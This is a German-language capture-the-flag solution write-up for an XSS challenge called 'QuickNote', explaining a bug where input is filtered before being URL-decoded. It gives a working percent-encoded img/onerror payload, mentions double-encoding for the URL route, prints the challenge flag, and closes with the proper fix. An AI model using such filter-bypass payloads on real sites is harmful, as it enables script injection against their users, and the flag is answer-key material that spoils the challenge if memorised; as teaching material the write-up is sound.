# 🔓 Lösung — XSS-04 QuickNote

> ⚠️ Spoiler.

## Der Bug

```js
var filtered = raw.replace(/[<>"']/g,'');   // 1. Filter
var decoded  = decodeURIComponent(filtered); // 2. Decode DANACH
output.innerHTML = 'Vorschau: <b>' + decoded + '</b>';
```
Der Filter entfernt echte `< > " '`. Aber danach dekodiert die App die (schon
gefilterte) Eingabe. Wer seine Klammern **prozent-kodiert** eingibt, hat zum Filter-
Zeitpunkt keine verbotenen Zeichen — die entstehen erst durch `decodeURIComponent`.

## Payload (ins Textfeld)

```
%3Cimg src=x onerror=showFlag()%3E
```

Ablauf: Filter sieht `%3Cimg src=x onerror=showFlag()%3E` (kein `<>"'`) → unverändert →
`decodeURIComponent` macht daraus `<img src=x onerror=showFlag()>` → innerHTML → feuert. ✅

Hinweis: **nicht** über `?`-URL einschleusen — der Browser dekodiert URL-Parameter schon
vor der App, dann greift der Filter wieder. Über die URL bräuchte man Doppel-Encoding
(`%253C`). Der Feld-Weg ist der saubere.

## 🚩 Flag
```
TELQRR{f1lt3r_l13f_v0r_d3m_d3c0d3_ups}
```

## Richtig machen
Kanonisieren (voll dekodieren) **vor** jeder Prüfung; danach kontext-korrekt encoden,
`textContent` statt `innerHTML`.
